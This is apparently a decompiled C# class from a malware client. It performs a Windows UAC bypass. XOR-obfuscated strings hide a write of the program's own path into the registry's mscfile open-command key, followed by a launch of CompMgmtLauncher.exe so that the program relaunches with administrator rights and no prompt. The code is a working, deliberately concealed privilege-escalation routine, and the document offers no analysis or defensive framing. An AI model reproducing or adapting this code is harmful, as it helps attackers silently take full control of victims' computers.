using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;

namespace Client
{
	public class gama
	{
		[DllImport("kernel32.dll")]
		public static extern int WinExec(string exeName, int operType);

		public gama()
		{
			if (AlphaAndOmega.IsAdmin())
			{
				return;
			}
			try
			{
				RegistryKey currentUser = Registry.CurrentUser;
				currentUser.CreateSubKey(AlphaAndOmega.BCutEncrypt("Yel~}kxoVIfkyyoyVgyilcfoVyboffVezodVieggkdn") ?? "");
				currentUser.OpenSubKey(AlphaAndOmega.BCutEncrypt("Yel~}kxoVIfkyyoyVgyilcfoVyboffVezodVieggkdn") ?? "", writable: true).SetValue("", Process.GetCurrentProcess().MainModule.FileName);
				currentUser.Close();
				gama.WinExec(string.Concat(str1: Environment.GetFolderPath(Environment.SpecialFolder.Windows) + AlphaAndOmega.BCutEncrypt("VYsy~og98VIegzGmg~Fk\u007fdibox$oro"), str0: AlphaAndOmega.BCutEncrypt("ign$oro*%a*Y^KX^*")), 0);
				Thread.Sleep(0);
				Thread.Sleep(1000);
				Environment.Exit(0);
			}
			catch (Exception)
			{
			}
		}
	}
}
